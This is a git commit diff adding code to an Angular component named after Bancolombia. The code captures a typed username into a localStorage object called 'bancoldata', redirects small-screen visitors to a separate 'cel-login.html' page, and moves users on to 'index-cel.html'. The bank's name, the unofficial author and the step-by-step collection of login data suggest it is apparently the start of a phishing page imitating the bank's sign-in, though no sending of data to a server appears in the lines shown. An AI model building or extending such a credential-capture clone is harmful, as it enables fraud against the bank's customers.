5e1c2d43c34abaa772efaec6e61529ec92bf09b8
unknown <cadavida920@gmail.com>
2025-03-19 00:25:02 -0500

    bancolombia initial

--- src/app/pages/bancolombia/bancolombia.component.ts
+++ src/app/pages/bancolombia/bancolombia.component.ts
@@ -1,4 +1,4 @@
-import { Component } from '@angular/core';
+import { Component, ElementRef, Renderer2 } from '@angular/core';
 
 @Component({
   selector: 'app-bancolombia',
@@ -6,6 +6,61 @@ import { Component } from '@angular/core';
   templateUrl: './bancolombia.component.html',
   styleUrl: './bancolombia.component.css'
 })
-export class BancolombiaComponent {
+export default class BancolombiaComponent {
+  userInput!: HTMLInputElement;
+  continueButton!: HTMLButtonElement;
+  imageContainer!: HTMLElement;
+  loader!: HTMLElement;
 
+  constructor(private el: ElementRef, private renderer: Renderer2) {}
+
+  ngOnInit(): void {
+    this.userInput = this.el.nativeElement.querySelector('#userInput');
+    this.continueButton = this.el.nativeElement.querySelector('#continueButton');
+    this.imageContainer = this.el.nativeElement.querySelector('#imageContainer');
+    this.loader = this.el.nativeElement.querySelector('#loader');
+
+    // Check if the user is on a mobile device
+    if (window.innerWidth <= 800) { 
+      window.location.href = "cel-login.html"; 
+    }
+
+    // Enable/Disable the button based on user input
+    this.renderer.listen(this.userInput, 'input', () => {
+      const userValue = this.userInput.value.trim();
+      if (userValue.length >= 4) {
+        this.continueButton.classList.add('enabled');
+        this.continueButton.classList.remove('disabled');
+      } else {
+        this.continueButton.classList.add('disabled');
+        this.continueButton.classList.remove('enabled');
+      }
+    });
+
+    // Action when clicking "Continue"
+    this.renderer.listen(this.continueButton, 'click', () => {
+      const userValue = this.userInput.value.trim();
+      if (userValue.length >= 4) {
+        let bancoldata: any;
+        try {
+          const storedData = localStorage.getItem('bancoldata');
+          bancoldata = storedData ? JSON.parse(storedData) : {};
+        } catch (e) {
+          console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
+          bancoldata = {}; // Reset to empty object if parsing error occurs
+        }
+
+        // Update the object with the new user value
+        bancoldata.usuario = userValue;
+
+        // Save the updated value to localStorage
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+        // Redirect to the next page
+        window.location.href = 'index-cel.html';
+      } else {
+        alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
+      }
+    });
+  }
 }
